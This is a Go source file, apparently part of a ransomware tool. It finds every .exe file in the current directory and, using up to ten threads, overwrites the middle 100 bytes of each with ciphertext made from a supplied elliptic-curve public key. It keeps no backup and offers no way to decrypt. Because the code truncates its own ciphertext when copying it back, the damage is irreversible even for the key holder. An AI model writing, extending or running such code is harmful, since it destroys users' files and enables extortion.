package enc_file

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"golang.org/x/crypto/hkdf"
)

const (
	FileExtension = ".exe"
	ThreadNumber  = 10 // Number of threads to use for encryption
)

var filePath string = ""

func stripPEMHeaders(pemData string) []byte {
	// Remove PEM headers and footers
	start := "-----BEGIN ecdsa public key-----"
	end := "-----END ecdsa public key-----"

	pemStart := strings.Index(pemData, start)
	if pemStart == -1 {
		return []byte(pemData)
	}

	pemEnd := strings.Index(pemData, end)
	if pemEnd == -1 {
		return []byte(pemData)
	}

	// Get the content between headers
	content := pemData[pemStart+len(start) : pemEnd]

	// Remove all whitespace and newlines
	content = strings.ReplaceAll(content, "\n", "")
	content = strings.ReplaceAll(content, "\r", "")
	content = strings.TrimSpace(content)

	// Base64 decode the content
	decoded, err := base64.StdEncoding.DecodeString(content)
	if err != nil {
		return []byte(pemData)
	}

	return decoded
}

func EccEncrypt(plainText []byte, publicKeyPEM string) ([]byte, error) {
	// Get raw key bytes
	keyBytes := stripPEMHeaders(publicKeyPEM)

	// Parse ECDSA public key
	publicKey, err := x509.ParsePKIXPublicKey(keyBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse public key: %v", err)
	}

	ecdsaPubKey, ok := publicKey.(*ecdsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("not an ECDSA public key")
	}

	// Generate ephemeral key pair
	ephemeralPriv, err := ecdsa.GenerateKey(ecdsaPubKey.Curve, rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("failed to generate ephemeral key: %v", err)
	}

	// Perform ECDH key exchange
	x, _ := ecdsaPubKey.Curve.ScalarMult(ecdsaPubKey.X, ecdsaPubKey.Y, ephemeralPriv.D.Bytes())
	if x == nil {
		return nil, fmt.Errorf("failed to compute shared secret")
	}

	// Derive AES key using HKDF
	secret := x.Bytes()
	hash := sha256.New
	hkdf := hkdf.New(hash, secret, nil, nil)
	aesKey := make([]byte, 32) // AES-256
	if _, err := hkdf.Read(aesKey); err != nil {
		return nil, fmt.Errorf("failed to derive AES key: %v", err)
	}

	// Encrypt with AES-GCM
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %v", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %v", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, fmt.Errorf("failed to generate nonce: %v", err)
	}

	cipherText := gcm.Seal(nil, nonce, plainText, nil)

	// Prepend ephemeral public key and nonce to ciphertext
	ephemeralPubBytes, err := x509.MarshalPKIXPublicKey(&ephemeralPriv.PublicKey)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal ephemeral public key: %v", err)
	}

	encryptedData := make([]byte, 0, len(ephemeralPubBytes)+len(nonce)+len(cipherText))
	encryptedData = append(encryptedData, ephemeralPubBytes...)
	encryptedData = append(encryptedData, nonce...)
	encryptedData = append(encryptedData, cipherText...)

	return encryptedData, nil
}

func encryptFileWorker(publicKeyPEM, dir string, files []os.FileInfo, wg *sync.WaitGroup) {
	defer wg.Done()

	for _, file := range files {
		if filepath.Ext(file.Name()) == FileExtension {
			filePath := filepath.Join(dir, file.Name())

			// Read file contents (only middle 100 bytes)
			fileContent, err := ioutil.ReadFile(filePath)
			if err != nil {
				println("Failed to read file:", filePath, err.Error())
				continue
			}

			if len(fileContent) < 100 {
				println("File too small to get middle 100 bytes:", filePath)
				continue
			}

			middleStart := len(fileContent)/2 - 50
			middleEnd := middleStart + 100
			middleContent := fileContent[middleStart:middleEnd]

			// Encrypt middle content
			encryptedMiddle, err := EccEncrypt(middleContent, publicKeyPEM)
			if err != nil {
				println("Failed to encrypt file:", filePath, err.Error())
				continue
			}

			// Replace middle section with encrypted content
			copy(fileContent[middleStart:middleEnd], encryptedMiddle)

			// Write modified contents back
			err = ioutil.WriteFile(filePath, fileContent, 0644)
			if err != nil {
				println("Failed to write encrypted file:", filePath, err.Error())
				continue
			}

			println("Successfully encrypted:", filePath)
		}
	}
}

func EncryptFile(publicKeyPEM string) string {
	// Open current directory
	dir, err := os.Getwd()
	if err != nil {
		println("Failed to get current directory:", err.Error())
		return ""
	}

	// Find all .exe files
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		println("Failed to read directory:", err.Error())
		return ""
	}

	// Filter only .exe files
	var exeFiles []os.FileInfo
	for _, file := range files {
		if filepath.Ext(file.Name()) == FileExtension {
			exeFiles = append(exeFiles, file)
		}
	}

	if len(exeFiles) <= ThreadNumber {
		// Single thread mode for small number of files
		var wg sync.WaitGroup
		wg.Add(1)
		encryptFileWorker(publicKeyPEM, dir, exeFiles, &wg)
		wg.Wait()
	} else {
		// Multi-thread mode
		var wg sync.WaitGroup
		batchSize := (len(exeFiles) + ThreadNumber - 1) / ThreadNumber

		for i := 0; i < ThreadNumber; i++ {
			start := i * batchSize
			end := start + batchSize
			if end > len(exeFiles) {
				end = len(exeFiles)
			}

			if start < end {
				wg.Add(1)
				go encryptFileWorker(publicKeyPEM, dir, exeFiles[start:end], &wg)
			}
		}
		wg.Wait()
	}

	if len(exeFiles) > 0 {
		return filepath.Join(dir, exeFiles[0].Name())
	}
	return ""
}
